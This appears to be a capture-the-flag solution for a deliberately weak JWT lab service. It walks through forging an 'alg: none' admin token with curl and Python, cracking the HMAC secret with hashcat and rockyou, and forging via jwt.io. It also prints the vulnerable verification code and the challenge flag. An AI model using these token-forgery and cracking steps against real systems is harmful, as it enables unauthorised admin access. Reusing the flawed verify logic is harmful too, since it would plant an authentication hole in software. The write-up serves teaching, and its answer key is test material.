# Solution — The Weak JWT

| Field | Value |
|---|---|
| Category | API Security |
| Path | `/api1/` |
| Flag | `flag{inm_n0n3_4lg0_byp4ss3s_4dm1ns}` |

## Setup

```bash
export BASE="https://10.50.234.208:5001"
# or: export BASE="http://127.0.0.1:5001"
```

Confirm: `curl -s "$BASE/health"` returns `{"ok":true,...}`.

## What you're looking at

The User Profile Service uses JWT auth with two bugs:

1. **`alg: none` accepted** — returns the payload without verifying a signature.
2. **Weak HMAC secret** (`secret123`) — cracked by any wordlist.

Either path reaches the flag. You only need to pick one.

---

## Option A — Command Line (curl)

### Step 1 — Log in

```bash
TOKEN=$(curl -s -X POST "$BASE/api1/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  | jq -r .token)

echo "$TOKEN"
```

### Step 2 — Confirm admin access is denied

```bash
curl -s "$BASE/api1/api/admin" -H "Authorization: Bearer $TOKEN"
```

Expected: `{"error":"forbidden"}`

### Step 3 — Forge an `alg: none` token

```bash
FORGED=$(python3 - <<'PY'
import base64, json
def b64(o):
    return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode()
print(f"{b64({'alg':'none','typ':'JWT'})}.{b64({'sub':'alice','role':'admin'})}.")
PY
)
```

### Step 4 — Call the admin endpoint

```bash
curl -s "$BASE/api1/api/admin" -H "Authorization: Bearer $FORGED"
```

Expected:

```json
{
  "flag": "flag{inm_n0n3_4lg0_byp4ss3s_4dm1ns}",
  "admin": true
}
```

---

## Option B — Browser (landing page + jwt.io)

The landing page has a login button and a "Forge a token" field. `jwt.io`
is a free, browser-based JWT editor.

### Step 1 — Open the challenge

```
https://<CTFd-Assigned-Host>/api1/
```

### Step 2 — Log in

Click **"Try login (alice/password123)"**. The log below the button shows:

```json
{ "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." }
```

Select and copy the `token` value. The **"Forge a token"** textarea also
auto-fills with `Bearer <jwt>`.

### Step 3 — Open jwt.io

In a new browser tab, go to **https://jwt.io**.

You'll see three panels: **Encoded** (left), **Decoded** (right), and a
**secret** input at the bottom.

### Step 4 — Decode your token

Paste your token (from Step 2) into the **Encoded** field. The **Decoded**
panel shows:

- **Header:** `{"alg": "HS256", "typ": "JWT"}`
- **Payload:** `{"sub": "alice", "role": "user"}`

### Step 5 — Forge an admin token with `alg: none`

In the **Decoded → Header** panel, change `"alg"` to `"none"`:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

In the **Decoded → Payload** panel, change `"role"` to `"admin"`:

```json
{
  "sub": "alice",
  "role": "admin"
}
```

The **Encoded** panel now shows a token like
`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.`

Note the trailing dot — `alg: none` means there's no signature. If jwt.io
shows a red "invalid signature" warning, that's fine; the server doesn't
verify signatures for `alg: none`.

### Step 6 — Use the forged token

Go back to the `/api1/` landing page. In the **"Forge a token"** textarea,
replace the existing value with:

```
Bearer <paste your alg:none token here>
```

Click **Call /api/admin**. The log shows the flag.

---

## Option C — Browser + jwt.io (weak secret crack)

If you want the more realistic path, crack the secret instead.

### Step 1 — Get a valid token

Follow Step 2 above to log in and copy the token.

### Step 2 — Crack the secret

**On command line:**

```bash
echo "<token>" > /tmp/jwt.txt
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
# or: john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/jwt.txt
```

**Recovered secret:** `secret123`

### Step 3 — Forge with jwt.io

1. Go to **https://jwt.io**
2. Paste your original token into the **Encoded** field.
3. Change **Payload → `"role"`** to `"admin"`.
4. Leave **Header → `"alg": "HS256"`** as-is.
5. In the **"your-256-bit-secret"** input at the bottom, enter `secret123`.
6. The **Encoded** field updates with a properly signed admin token.
7. Copy it.

### Step 4 — Call the admin endpoint

Back on `/api1/`, paste `Bearer <new token>` in the **Forge a token**
textarea and click **Call /api/admin**.

---

## Option D — Postman Web

1. Go to **https://web.postman.co** and sign in (free account).
2. Create a new HTTP request.
3. **Login:** method `POST`, URL `<BASE>/api1/api/login`, Body → raw → JSON:

   ```json
   {"username": "alice", "password": "password123"}
   ```

   Send. Copy the `token` from the response.

4. **Forge:** use jwt.io (Option B) to produce an admin token.
5. **Call admin:** method `GET`, URL `<BASE>/api1/api/admin`, Headers →
   `Authorization: Bearer <forged token>`. Send.

The response contains the flag.

---

## Submit

```
flag{inm_n0n3_4lg0_byp4ss3s_4dm1ns}
```

## Why it works

```python
def _verify(token):
    header = json.loads(_b64url_decode(token.split(".")[0]))
    if header.get("alg", "").lower() == "none":
        return payload                    # ← no signature check
    if alg == "hs256":
        return jwt.decode(token, WEAK_SECRET, algorithms=["HS256"])
```

Two failures: `none` accepted, and `WEAK_SECRET = "secret123"`.

## Key takeaways

- **Pin the algorithm.** Never trust `alg` from an untrusted source.
- Use a ≥256-bit random HMAC secret.
- Decoy endpoints (`/api1/api/debug`, `/api1/api/v2/admin`) always return
  403 — traps for automated scanners. Only `/api1/api/admin` matters.

## Troubleshooting

| Symptom | Fix |
|---|---|
| `{"error":"missing token"}` | You forgot `Authorization: Bearer …`. |
| `{"error":"invalid token"}` | Forged token malformed — remove the trailing signature properly. |
| `403` on `/api1/api/admin` | Your payload lacks `"role":"admin"`. |
| jwt.io shows "invalid signature" | Expected for `alg: none` — the server ignores signatures in that mode. |
| `401` on login | Username `alice`, password `password123`. |